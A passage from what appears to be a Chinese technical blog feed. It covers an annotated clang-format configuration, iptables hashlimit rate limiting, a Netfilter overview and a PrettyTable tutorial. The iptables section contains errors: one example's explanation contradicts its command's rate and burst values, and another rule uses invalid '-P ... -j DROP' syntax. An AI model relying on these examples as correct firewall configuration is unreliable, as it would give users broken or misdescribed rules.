class="line"><span class="comment"># 多行声明语句按 = 号对齐</span></span><br><span class="line">AlignConsecutiveDeclarations: <span class="literal">false</span></span><br><span class="line"><span class="comment"># （EscapedNewlineAlignmentStyle）用于在转义换行符中对齐反斜杠的选项，可能的值如下所示：</span></span><br><span class="line">AlignEscapedNewlines: Right</span><br><span class="line">+ ENAS_DontAlign：在配置DontAlign中不要对齐转义的换行符；</span><br><span class="line">+ ENAS_Left：在配置Left中尽可能向左对齐转义的换行符；</span><br><span class="line">+ ENAS_Right：在配置Right中对齐最右列中的转义换行符</span><br><span class="line"><span class="comment"># （bool）是否水平对齐二进制和三元表达式的操作数</span></span><br><span class="line">AlignOperands:   <span class="literal">true</span></span><br><span class="line"><span class="comment"># 是否把注释右对齐,下面为右对齐的效果</span></span><br><span class="line"><span class="comment">#void someFunction() &#123;</span></span><br><span class="line"><span class="comment">#doWork(); // Does something</span></span><br><span class="line"><span class="comment">#doMoreWork(); // Does something else</span></span><br><span class="line"><span class="comment">#&#125;</span></span><br><span class="line">AlignTrailingComments: <span class="literal">true</span></span><br><span class="line"><span class="comment"># （bool）是否允许将函数声明的所有参数放到下一行（BinPackParameters为false不影响该参数）</span></span><br><span class="line">AllowAllParametersOfDeclarationOnNextLine: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 是否允许短代码块在一行写完</span></span><br><span class="line"><span class="comment"># 如 if (a) &#123; return; &#125;</span></span><br><span class="line">AllowShortBlocksOnASingleLine: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 是否允许短switch的case 语句在一行写完</span></span><br><span class="line">AllowShortCaseLabelsOnASingleLine: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 是否允许短的函数在一行写完</span></span><br><span class="line">AllowShortFunctionsOnASingleLine: All</span><br><span class="line"><span class="comment"># 是否允许短的语句在一行写完</span></span><br><span class="line">AllowShortIfStatementsOnASingleLine: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 是否允许短的循环在一行写完，如果为真（true）, 语句“while (true) continue;” 能被放到单行</span></span><br><span class="line">AllowShortLoopsOnASingleLine: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 用于函数定义返回类型换行样式，这个选项是过时的并且被保留向后兼容（可选值如下所示）</span></span><br><span class="line">AlwaysBreakAfterDefinitionReturnType: None</span><br><span class="line">+ DRTBS_None (在配置中： None) 再返回类型后自动换行，PenaltyReturnTypeOnItsOwnLine 会被考虑到；</span><br><span class="line">+ DRTBS_All (在配置中： All) 总是在返回类型后换行；</span><br><span class="line">+ DRTBS_TopLevel (在配置中： TopLevel) 总是在返回类型的顶级函数后换行；</span><br><span class="line"><span class="comment"># 用于函数声明返回类型换行样式（可选值如下所示）</span></span><br><span class="line">AlwaysBreakAfterReturnType: None</span><br><span class="line">+ RTBS_None (在配置中： None) 在返回类型后自动换行。“PenaltyReturnTypeOnItsOwnLine”会被考虑.</span><br><span class="line">+ RTBS_All (在配置中： All) 再返回类型后总是换行；</span><br><span class="line">+ RTBS_TopLevel (在配置中： TopLevel) 在方法的顶层的返回类型后总是换行；</span><br><span class="line">+ RTBS_AllDefinitions (在配置中： AllDefinitions) 在方法定义中的返回类型后总是换行；</span><br><span class="line">+ RTBS_TopLevelDefinitions (在配置中： TopLevelDefinitions) 在顶层定义的返回类型后总是换行</span><br><span class="line"><span class="comment"># 使在文件中有多行字符串的情况看起来更一致。因此，如果字符串被“ContinuationIndentWidth”空格导致换行，它将会在行首生效。如果为真（true）, 在多行字面量字符串前总是换行</span></span><br><span class="line">AlwaysBreakBeforeMultilineStrings: <span class="literal">false</span></span><br><span class="line">AlwaysBreakTemplateDeclarations: MultiLine</span><br><span class="line"><span class="comment"># 如果为假（false）， 函数调用的参数要么是在同一行上，要么将在同一行上有一行</span></span><br><span class="line">BinPackArguments: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 如果为假（false）， 函数声明或函数定义的参数将都在同一行上，或各有一行</span></span><br><span class="line">BinPackParameters: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 控制单独的大括号换行事件，如果“BreakBeforeBraces”设置为“BS_Custom”, 使用这个指定如何处理每个单独的括号的情况。否则，这是被忽略的嵌套结构的标志</span></span><br><span class="line">BraceWrapping:</span><br><span class="line">  <span class="comment"># 使类定义换行</span></span><br><span class="line">  AfterClass:      <span class="literal">false</span></span><br><span class="line">  <span class="comment"># 使控制语句(if/for/while/switch/..)换行</span></span><br><span class="line">  AfterControlStatement: <span class="literal">false</span></span><br><span class="line">  <span class="comment"># 使枚举定义换行</span></span><br><span class="line">  AfterEnum:       <span class="literal">false</span></span><br><span class="line">  <span class="comment"># 使方法定义换行</span></span><br><span class="line">  AfterFunction:   <span class="literal">false</span></span><br><span class="line">  <span class="comment"># 使命名空间定义换行</span></span><br><span class="line">  AfterNamespace:  <span class="literal">false</span></span><br><span class="line">  <span class="comment"># 使OC定义(@autoreleasepool, interfaces, ..)换行</span></span><br><span class="line">  AfterObjCDeclaration: <span class="literal">false</span></span><br><span class="line">  <span class="comment"># 使结构体定义换行</span></span><br><span class="line">  AfterStruct:     <span class="literal">false</span></span><br><span class="line">  <span class="comment"># 使共同体定义换行</span></span><br><span class="line">  AfterUnion:      <span class="literal">false</span></span><br><span class="line">  AfterExternBlock: <span class="literal">false</span></span><br><span class="line">  <span class="comment"># 在catch之前换行</span></span><br><span class="line">  BeforeCatch:     <span class="literal">false</span></span><br><span class="line">  <span class="comment"># 在else之前换行</span></span><br><span class="line">  BeforeElse:      <span class="literal">false</span></span><br><span class="line">  <span class="comment"># 缩进换行的大括号</span></span><br><span class="line">  IndentBraces:    <span class="literal">false</span></span><br><span class="line">  SplitEmptyFunction: <span class="literal">true</span></span><br><span class="line">  SplitEmptyRecord: <span class="literal">true</span></span><br><span class="line">  SplitEmptyNamespace: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 在二元运算符前断行</span></span><br><span class="line">BreakBeforeBinaryOperators: None</span><br><span class="line"><span class="comment"># 括号的断行模式</span></span><br><span class="line">BreakBeforeBraces: Attach</span><br><span class="line">BreakBeforeInheritanceComma: <span class="literal">false</span></span><br><span class="line">BreakInheritanceList: BeforeColon</span><br><span class="line"><span class="comment"># 在三元运算符前断行</span></span><br><span class="line">BreakBeforeTernaryOperators: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 在构造函数初始化时按逗号断行,并以冒号对齐</span></span><br><span class="line">BreakConstructorInitializersBeforeComma: <span class="literal">false</span></span><br><span class="line">BreakConstructorInitializers: BeforeColon</span><br><span class="line">BreakAfterJavaFieldAnnotations: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 当格式化时，总是对字面量字符串换行</span></span><br><span class="line">BreakStringLiterals: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 最大宽度,如果代码超过这个宽度会按语义折行</span></span><br><span class="line">ColumnLimit:     80</span><br><span class="line"><span class="comment"># 一个固定的表达式，它描述了具有特殊意义的注释，不应该被分裂成行或以其他方式改变</span></span><br><span class="line">CommentPragmas:  <span class="string">&#x27;^ IWYU pragma:&#x27;</span></span><br><span class="line">CompactNamespaces: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 如果构造函数初始化器不适合在一行，把每个初始化放到单独的行</span></span><br><span class="line">ConstructorInitializerAllOnOneLineOrOnePerLine: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 使用构造函数初始化列表缩进的字符数</span></span><br><span class="line">ConstructorInitializerIndentWidth: 4</span><br><span class="line"><span class="comment"># 在续行(/下一行)时的缩进长度</span></span><br><span class="line">ContinuationIndentWidth: 4</span><br><span class="line">Cpp11BracedListStyle: <span class="literal">true</span></span><br><span class="line">DerivePointerAlignment: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 禁用当前format文件</span></span><br><span class="line">DisableFormat:   <span class="literal">false</span></span><br><span class="line"><span class="comment"># 如果为真（true）, clang-format检测函数调用和定义格式化为每行一个参数。每个调用都可以被包装，每行一个或不确定的。如果是不确定的，例如完全在一行，但需要做出一个决定，clang-format分析文件中是否有其他被包装的事例和相应的行动。</span></span><br><span class="line"><span class="comment"># 注意：这是一个实验标志，可能会消失或被重命名。不要在配置文件中使用。你自己要为你的使用负责</span></span><br><span class="line">ExperimentalAutoDetectBinPacking: <span class="literal">false</span></span><br><span class="line">FixNamespaceComments: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 一个宏，应解释为foreach循环而不是作为函数调用矢量</span></span><br><span class="line">ForEachMacros:</span><br><span class="line">  - foreach</span><br><span class="line">  - Q_FOREACH</span><br><span class="line">  - BOOST_FOREACH</span><br><span class="line">IncludeBlocks:   Preserve</span><br><span class="line"><span class="comment"># 正则表达式表示不同的#include类别被用于#includes命令，这些正则表达式与一个包含（包括&lt; &gt;或“）的文件的文件名相匹配。属于第一匹配正则表达式的值被分配，并且#include首先根据增加类别数然后在每个类别按字母的顺序排序。如果正则表达式都不匹配，int_max分配类别。源文件的主要头引用自动获取类别0。因此，它通常是保持在#include开头（http://llvm.org/docs/CodingStandards.html#include-style）。然而，如果你有总是需要排在首位的头引用，你也可以分配负面的优先事项。为了在.clang-format文件中配置这个, 请使用</span></span><br><span class="line">IncludeCategories:</span><br><span class="line">  - Regex:           <span class="string">&#x27;^&quot;(llvm|llvm-c|clang|clang-c)/&#x27;</span></span><br><span class="line">    Priority:        2</span><br><span class="line">  - Regex:           <span class="string">&#x27;^(&lt;|&quot;(gtest|gmock|isl|json)/)&#x27;</span></span><br><span class="line">    Priority:        3</span><br><span class="line">  - Regex:           <span class="string">&#x27;.*&#x27;</span></span><br><span class="line">    Priority:        1</span><br><span class="line"><span class="comment"># 指定一个常用的可以在文件主要包括映射的正则表达式的表达式，在猜测是否#include是“main”include（指定类别0，见上文），使用这个正则表达式允许后缀的头引用源。部分匹配完成，所以说：-“”意思是任意后缀，-“$”的意思是没有后缀，例如，如果配置”（_test）？$”，然后.h将被视为包括在a.cc和a_test.ccde中的“main”。</span></span><br><span class="line">IncludeIsMainRegex: <span class="string">&#x27;(Test)?$&#x27;</span></span><br><span class="line"><span class="comment"># case语句的位置总是在switch语句后缩进一级</span></span><br><span class="line">IndentCaseLabels: <span class="literal">false</span></span><br><span class="line">IndentPPDirectives: None</span><br><span class="line"><span class="comment"># 用于缩进的列数</span></span><br><span class="line">IndentWidth:     2</span><br><span class="line"><span class="comment"># 缩进如果函数定义或声明后包的类型</span></span><br><span class="line">IndentWrappedFunctionNames: <span class="literal">false</span></span><br><span class="line"><span class="comment"># JavaScriptQuotes中可能的值如下所示</span></span><br><span class="line">JavaScriptQuotes: Leave</span><br><span class="line">+ JSQS_Leave (在配置中： Leave) 留下字符串原本的括号；</span><br><span class="line">+ JSQS_Single (在配置中： Single) 总是使用单括号；</span><br><span class="line">+ JSQS_Double (在配置中： Double) 总是使用双括号</span><br><span class="line">JavaScriptWrapImports: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 在block从空行开始</span></span><br><span class="line">KeepEmptyLinesAtTheStartOfBlocks: <span class="literal">true</span></span><br><span class="line"><span class="comment"># block开始的正则</span></span><br><span class="line">MacroBlockBegin: <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># block开始的正则</span></span><br><span class="line">MacroBlockEnd:   <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># 允许最大连续空行数</span></span><br><span class="line">MaxEmptyLinesToKeep: 1</span><br><span class="line"><span class="comment"># 命名空间缩进</span></span><br><span class="line">NamespaceIndentation: None</span><br><span class="line">ObjCBinPackProtocolList: Auto</span><br><span class="line"><span class="comment"># block内的缩进</span></span><br><span class="line">ObjCBlockIndentWidth: 2</span><br><span class="line"><span class="comment"># 是否需要在&quot;@property&quot;后加上空格</span></span><br><span class="line">ObjCSpaceAfterProperty: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 是否需要在协议名后加上空格</span></span><br><span class="line">ObjCSpaceBeforeProtocolList: <span class="literal">true</span></span><br><span class="line">PenaltyBreakAssignment: 2</span><br><span class="line"><span class="comment"># 在调用小括号“（”后给一个方法调用换行的处罚</span></span><br><span class="line">PenaltyBreakBeforeFirstCallParameter: 19</span><br><span class="line"><span class="comment"># 包含在一个注释中的每一个换行的处罚</span></span><br><span class="line">PenaltyBreakComment: 300</span><br><span class="line"><span class="comment"># 在第一个“&lt;&lt;”前的换行的处罚</span></span><br><span class="line">PenaltyBreakFirstLessLess: 120</span><br><span class="line"><span class="comment"># 包含一个字面量的字符串中的每一个换行的处罚</span></span><br><span class="line">PenaltyBreakString: 1000</span><br><span class="line">PenaltyBreakTemplateDeclaration: 10</span><br><span class="line"><span class="comment"># 最多能超出ColumnLimit多少个字符</span></span><br><span class="line">PenaltyExcessCharacter: 1000000</span><br><span class="line"><span class="comment"># 把一个方法返回类型放到函数的同一行</span></span><br><span class="line">PenaltyReturnTypeOnItsOwnLine: 60</span><br><span class="line"><span class="comment"># 指针在类型那边还是在变量名那边还是在中间</span></span><br><span class="line">PointerAlignment: Right</span><br><span class="line"><span class="comment"># 如果为真（true）, clang-format 将会尝试将注释重新流布局</span></span><br><span class="line">ReflowComments:  <span class="literal">true</span></span><br><span class="line"><span class="comment"># 如果为真（true）, clang-format 将会分类#includes</span></span><br><span class="line">SortIncludes:    <span class="literal">true</span></span><br><span class="line">SortUsingDeclarations: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 如果为真（true）, 可能在一个C样式描述后插入一个空格</span></span><br><span class="line">SpaceAfterCStyleCast: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 如果为真（true）, 在“template”关键字后插入一个空格</span></span><br><span class="line">SpaceAfterTemplateKeyword: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 如果为假（false），移除分配操作符（=）前空格</span></span><br><span class="line">SpaceBeforeAssignmentOperators: <span class="literal">true</span></span><br><span class="line">SpaceBeforeCpp11BracedList: <span class="literal">false</span></span><br><span class="line">SpaceBeforeCtorInitializerColon: <span class="literal">true</span></span><br><span class="line">SpaceBeforeInheritanceColon: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 是否在括号前加上空格</span></span><br><span class="line">SpaceBeforeParens: ControlStatements</span><br><span class="line">SpaceBeforeRangeBasedForLoopColon: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 是否在空括号中加空格</span></span><br><span class="line">SpaceInEmptyParentheses: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 单行注释前的空格数 </span></span><br><span class="line">SpacesBeforeTrailingComments: 1</span><br><span class="line"><span class="comment"># 是否在&lt;&gt;中间插入空格 </span></span><br><span class="line">SpacesInAngles:  <span class="literal">false</span></span><br><span class="line"><span class="comment"># 是否在容器字面量(@[@&quot;1&quot;,@&quot;2&quot;])中插入空格</span></span><br><span class="line">SpacesInContainerLiterals: <span class="literal">true</span></span><br><span class="line"><span class="comment"># 如果为真（true）, 将会在C样式描述中插入空格</span></span><br><span class="line">SpacesInCStyleCastParentheses: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 是否在非空的括号中插入空格</span></span><br><span class="line">SpacesInParentheses: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 如果为真（true）,将会在“[”之后和“]”之前插入空格</span></span><br><span class="line">SpacesInSquareBrackets: <span class="literal">false</span></span><br><span class="line"><span class="comment"># 用这个标准格式化：例如：在LS_Cpp03中使用 A&lt;A&lt;int&gt; &gt; 而不是 A&lt;A&lt;int&gt;&gt;（可能的值如下所示）</span></span><br><span class="line">+ LS_Cpp03 (在配置中： Cpp03) 使用Use C++03统一语法；</span><br><span class="line">+ LS_Cpp11 (在配置中： Cpp11) 使用C++11的特征(例如 A&lt;A&lt;int&gt;&gt;而不是A&lt;A&lt;int&gt; &gt;)；</span><br><span class="line">+ LS_Auto (在配置中： Auto) 基于输入自动检查；</span><br><span class="line">Standard:        Cpp11</span><br><span class="line"><span class="comment"># tab的缩进空格数</span></span><br><span class="line">TabWidth:        8</span><br><span class="line"><span class="comment"># 在结果文件中使用制表符字符的方式可能的值如下所示）</span></span><br><span class="line">UseTab:          Never</span><br><span class="line">+ UT_Never (在配置中： Never) 从不使用制表符；</span><br><span class="line">+ UT_ForIndentation (在配置中： ForIndentation) 仅缩排时使用制表符；</span><br><span class="line">+ UT_Always (在配置中： Always) 使用标签时，我们需要填补的空白，至少从一个制表位到下一个；</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h1 id="四、编辑器集成"><a href="#四、编辑器集成" class="headerlink" title="四、编辑器集成"></a>四、编辑器集成</h1><p>编辑器在vscode上面的集成信息</p>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> Format </tag>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hashlimit-Iptables笔记</title>
      <link href="/2019/01/04/iptables-hashlimit/"/>
      <url>/2019/01/04/iptables-hashlimit/</url>
      
        <content type="html"><![CDATA[<h1 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h1><p>hashlimit是iptables的一个匹配模块，用它结合iptables的其它命令可以实现限速的功能。<strong>注意：单独hashlimit模块是无法进行限速的</strong>；</p><h1 id="二、原理介绍"><a href="#二、原理介绍" class="headerlink" title="二、原理介绍"></a>二、原理介绍</h1><p>实际上，使用 hashlimit 进行限速主要包括两个步骤：</p><ul><li>对符合 hashlimit 匹配规则包放行</li><li>丢弃&#x2F;拒绝未放行的包</li></ul><h2 id="2-1-令牌桶模型"><a href="#2-1-令牌桶模型" class="headerlink" title="2.1 令牌桶模型"></a>2.1 令牌桶模型</h2><p>hashlimit 的匹配方式是基于令牌桶（Token bucket）的模型，令牌桶是一种网络通讯中常见的缓冲区工作原理，它有两个重要的参数，<code>令牌桶容量n</code>和<code>令牌产生速率s</code>；</p><ul><li><code>令牌桶容量n</code>：可以把令牌当成是门票，而令牌桶则是负责制作和发放门票的管理员，它手里最多有n张令牌。初始时，管理员开始手里有n张令牌，每当一个数据包到达后，管理员就看看手里是否还有可用的令牌。如果有，就把令牌发给这个数据包，hashlimit 就告诉iptables，这个数据包被匹配了，而当管理员把手上所有的令牌都发完了，再来的数据包就拿不到令牌了；这时，hashlimit 模块就告诉 iptables ，这个数据包不能被匹配，对应参数<code>--hashlimit-burst</code>；</li><li><code>令牌产生速率s</code>：当令牌桶中的令牌数量少于n，它就会以速率s来产生新的令牌，直到令牌数量到达n为止；</li></ul><p>通过令牌桶机制，可以有效的控制单位时间内通过（匹配）的数据包数量，又可以容许短时间内突发的大量数据包的通过（只要数据包数量不超过令牌桶n），对应参数<code>--hashlimit</code>；</p><h2 id="2-2-匹配项"><a href="#2-2-匹配项" class="headerlink" title="2.2 匹配项"></a>2.2 匹配项</h2><p>除了令牌桶模型外，hashlimit 匹配的另外一个重要概念是匹配项。在hashlimit中，每个匹配项拥有一个单独的令牌桶，执行独立的匹配计算，对应参数<code>--hashlimit-mode</code>，匹配项的可选参数为以下几种：</p><ul><li><code>srcip</code>：每个源地址IP为一个匹配项；</li><li><code>dstip</code>：每个目的地址IP为一个匹配项；</li><li><code>srcport</code>：每个源端口为一个匹配项；</li><li><code>dstport</code>：每个目的端口为一个匹配项；</li></ul><h2 id="2-3-相关配置参数"><a href="#2-3-相关配置参数" class="headerlink" title="2.3 相关配置参数"></a>2.3 相关配置参数</h2><p>hashlimit 的相关匹配项参数介绍如下：</p><ul><li><p><code>--hashlimit-name</code>：该参数指定了每个调用了 hashlimit 模块的 iptables 命令而建立的文件名，该文件存放在 &#x2F;proc&#x2F;net&#x2F;ipt_hashlimit 目录中，其中保存着各匹配项的信息；</p></li><li><p><code>--hashlimit</code>：令牌产生速率，示例：5&#x2F;sec 代表每秒产生5个；</p></li><li><p><code>--hashlimit-burst</code>：令牌桶容量，默认是5；</p></li><li><p><code>--hashlimit-mode</code>：匹配项，每个匹配项拥有一个单独的令牌桶，执行独立的匹配计算，可选参数如下所示：</p><ul><li><code>srcip</code>：每个源地址IP为一个匹配项；</li><li><code>dstip</code>：每个目的地址IP为一个匹配项；</li><li><code>srcport</code>：每个源端口为一个匹配项；</li><li><code>dstport</code>：每个目的端口为一个匹配项；</li></ul></li><li><p><code>--hashlimit-htable-size</code>：设置哈希表的元值；</p></li><li><p><code>--hashlimit-htable-max</code>：设定哈希表入口最大数量；</p></li></ul><h1 id="三、示例介绍"><a href="#三、示例介绍" class="headerlink" title="三、示例介绍"></a>三、示例介绍</h1><h2 id="3-1-实例一"><a href="#3-1-实例一" class="headerlink" title="3.1 实例一"></a>3.1 实例一</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -A INPUT -p tcp --dport 1234 -m hashlimit --hashlimit-name HashLimitName --hashlimit 1/sec --hashlimit-burst 1 --hashlimit-mode srcip -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp --dport 1234 -j DROP</span><br></pre></td></tr></table></figure><p>上述实例解释信息为：</p><ul><li>为所有访问本机 1234 端口的不同IP建立一个匹配项；</li><li>匹配项对应的令牌桶容量为10；</li><li>令牌产生速率为5个每秒；</li><li>放行通过匹配的数据包；</li><li>丢弃所有其它访问本机 1234 端口的数据包；</li></ul><h2 id="3-2-实例二"><a href="#3-2-实例二" class="headerlink" title="3.2 实例二"></a>3.2 实例二</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">iptables -N DEFLOOD </span><br><span class="line">iptables -A FORWARD -s 192.168.1.2/24 -m state --state NEW -j DEFLOOD </span><br><span class="line">iptables -A DEFLOOD -m hashlimit --hashlimit-name deflood --hashlimit 10/sec </span><br><span class="line">--hashlimit-burst 10 --hashlimit-mode srcip -j ACCEPT </span><br><span class="line">iptables -P DEFLOOD -j DROP </span><br></pre></td></tr></table></figure><ul><li>建立了一个自定义的处理链；</li><li>所有来自于 192.168.1.2&#x2F;24 网段的并且打算新建网络连接的数据包，都进入 DEFLOOD 链处理 ；</li><li>在 DEFLOOD 链中，为每个IP建立一个匹配项，对应令牌桶容量为10，产生速率为10个每秒；</li><li>放行通过匹配的数据包；</li><li>在 DEFLOOD 链中丢弃所有其它的数据包 ；</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> hashlimit </tag>
            
            <tag> Iptables </tag>
            
            <tag> Netfilter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux内核软件框架-Netfilter概述</title>
      <link href="/2019/01/03/netfilter/"/>
      <url>/2019/01/03/netfilter/</url>
      
        <content type="html"><![CDATA[<h1 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h1><p><a href="https://www.netfilter.org/">Netfilter</a>是Linux内核中的一个软件框架，用于管理网络数据包。不仅具有网络地址转换（NAT）的功能，也具备数据包内容修改、以及数据包过滤等防火墙功能。利用运作于用户空间的应用软件，如<a href="https://www.netfilter.org/projects/iptables/index.html">iptables</a>等，来控制Netfilter，系统管理者可以管理通过Linux操作系统的各种网络数据包。1990年代，Netfilter在Linux 2.3.15版时进入Linux内核，正式应用于Linux 2.4版。</p><p>现今许多市面上许多的IP分享器或无线网络路由器（Wireless router），多是嵌入式Linux平台，并利用Netfilter的数据包处理能力，提供NAT以及防火墙的功能。此外，Netfilter平台的模块化设计使得功能具可扩展性，以及Linux核心本身属于开放的源代码，能够免费获取源代码进行修改与扩展。Netfilter平台中制定了五个数据包的挂载点（Hook），分别是PRE_ROUTING、INPUT、OUTPUT、FORWARD与POST_ROUTING。</p><h1 id="二、原理"><a href="#二、原理" class="headerlink" title="二、原理"></a>二、原理</h1><p>Linux网络内核中存在5条内置chain，针对于每条chain，Netfilter都有与之对应的hook，他们的对应关系如下所示（左为chain，右为hook）：</p><ul><li><code>PREROUTING</code>：由<code>NF_IP_PRE_ROUTING</code>触发；</li><li><code>INPUT</code>：由<code>NF_IP_LOCAL_IN</code>触发；</li><li><code>FORWARD</code>：由<code>NF_IP_FORWARD</code>触发；</li><li><code>OUTPUT</code>：由<code>NF_IP_LOCAL_OUT</code>触发；</li><li><code>POSTROUTING</code>：由<code>NF_IP_POST_ROUTING</code>触发；</li></ul><p>Netfilter通过在内核中嵌入的这五个NF_HOOK函数的位置上注册相关函数，截断数据包的流动，从而完成对数据包的过滤和转换。</p><p><img src="https://cdn.bugwz.com/image-20190816163744122.png" alt="Packet flow in Netfilter and General Networking"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Netfilter </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PrettyTable-Python使用笔记</title>
      <link href="/2019/01/02/python-prettytable/"/>
      <url>/2019/01/02/python-prettytable/</url>
      
        <content type="html"><![CDATA[<h2 id="一、简述"><a href="#一、简述" class="headerlink" title="一、简述"></a>一、简述</h2><p>PrettyTable是一个简单的Python库，旨在快速，轻松地在视觉上吸引人的ASCII表中表示表格数据。 它的灵感来自PostgreSQL shell psql中使用的ASCII表。 PrettyTable允许选择要打印的列，列的独立对齐（左对齐或右对齐或居中）以及通过指定行范围打印“子表”。<a href="https://github.com/dprince/python-prettytable">GitHub</a></p><h2 id="二、安装与使用"><a href="#二、安装与使用" class="headerlink" title="二、安装与使用"></a>二、安装与使用</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 安装：使用pip可以方便的安装PrettyTable</span></span><br><span class="line">pip install PrettyTable</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用：python代码中引入该库</span></span><br><span class="line">import prettytable as pt</span><br></pre></td></tr></table></figure><h2 id="三、相关API介绍"><a href="#三、相关API介绍" class="headerlink" title="三、相关API介绍"></a>三、相关API介绍</h2><h3 id="3-1、创建表"><a href="#3-1、创建表" class="headerlink" title="3.1、创建表"></a>3.1、创建表</h3><h4 id="3-1-1、普通创建表："><a href="#3-1-1、普通创建表：" class="headerlink" title="3.1.1、普通创建表："></a>3.1.1、普通创建表：</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> prettytable <span class="keyword">as</span> pt</span><br><span class="line">tb = pt.PrettyTable()</span><br></pre></td></tr></table></figure><h4 id="3-1-2、从已有的文件中创建"><a href="#3-1-2、从已有的文件中创建" class="headerlink" title="3.1.2、从已有的文件中创建"></a>3.1.2、从已有的文件中创建</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 【利用CSV文件创建】</span></span><br><span class="line"><span class="comment"># + 变量pt将是一个完全填充的PrettyTable对象；</span></span><br><span class="line"><span class="comment"># + CSV文件的第一行将被解释为字段名称并用于表头；</span></span><br><span class="line"><span class="comment"># + 可以通过传递“field_names”关键字参数来指定自己的字段名称；</span></span><br><span class="line"><span class="keyword">from</span> prettytable <span class="keyword">import</span> from_csv</span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&quot;mytable.csv&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">pt = from_csv(fp)</span><br><span class="line">fp.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 【利用HTMl文件创建】</span></span><br><span class="line"><span class="comment"># + 变量pts将是PrettyTable对象的列表；</span></span><br><span class="line"><span class="comment">#+ HTML代码中每个&lt;table&gt;都有一个PrettyTable；</span></span><br><span class="line"><span class="keyword">from</span> prettytable <span class="keyword">import</span> from_html </span><br><span class="line">pts = from_html(html_string)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 【利用SQL获取信息创建】</span></span><br><span class="line"><span class="comment">#+ db_cur是数据库的Cursor对象</span></span><br><span class="line"><span class="comment"># + 数据库中的数据具有与DB-API2规范兼容的Python API（例如，标准库中的sqlite3 API）；</span></span><br><span class="line"><span class="comment"># + 可以使用SELECT语句的结果生成一个PrettyTable</span></span><br><span class="line"><span class="keyword">from</span> prettytable <span class="keyword">import</span> from_db_cursor </span><br><span class="line">db_cur.execute(<span class="string">&quot;SELECT * FROM mytable&quot;</span>)</span><br><span class="line">pt = from_db_cursor(db_cur)</span><br></pre></td></tr></table></figure><h3 id="3-2、添加元素"><a href="#3-2、添加元素" class="headerlink" title="3.2、添加元素"></a>3.2、添加元素</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 按行添加</span></span><br><span class="line">pt.add_row()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 按列添加</span></span><br><span class="line">pt.add_column()</span><br></pre></td></tr></table></figure><h3 id="3-3、输出格式"><a href="#3-3、输出格式" class="headerlink" title="3.3、输出格式"></a>3.3、输出格式</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ASCII码表 - 直接输出</span></span><br><span class="line"><span class="built_in">print</span>(pt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ASCII码表 - 无表格框输出</span></span><br><span class="line"><span class="comment"># + get_string（）方法返回一个unicode对象，而不是ASCII编码的字节字符串；</span></span><br><span class="line"><span class="built_in">print</span>(pt.get_string())</span><br><span class="line"></span><br><span class="line"><span class="comment"># HTML表</span></span><br><span class="line"><span class="comment">#+ 可以使用“attribute”关键字参数来传递应该出现在开始&lt;table&gt;标记中的HTML属性的字典；</span></span><br><span class="line"><span class="comment">#+ 可以使用CSS来设置表格的样式而不是依赖于PrettyTable的格式；</span></span><br><span class="line"><span class="built_in">print</span>(pt.get_html_string())</span><br><span class="line"><span class="built_in">print</span>(pt.get_html_string(attributes = &#123;<span class="string">&quot;class&quot;</span>: <span class="string">&quot;foo&quot;</span>&#125;))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择子表输出</span></span><br><span class="line"><span class="built_in">print</span>(pt.get_string(fields = [<span class="string">&quot;City name&quot;</span>, <span class="string">&quot;Population&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 仅输出前三列</span></span><br><span class="line"><span class="built_in">print</span>(pt.get_string(start = <span class="number">0</span>, end = <span 